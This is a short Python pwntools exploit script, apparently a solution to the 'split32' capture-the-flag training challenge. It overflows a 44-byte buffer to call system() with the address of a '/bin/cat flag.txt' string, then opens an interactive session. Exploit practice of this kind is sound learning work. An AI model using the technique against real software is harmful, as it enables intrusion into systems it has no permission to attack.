import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./split32"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf


p.recvuntil("> ")

# 44 byte to esp, esp = system(), arg = "/bin/cat flag.txt"
payload = b"A"*44 + pwn.pack(elf.sym['system']) + b"AAAA" + pwn.pack(0x0804a030)
p.sendline(payload)


p.interactive()
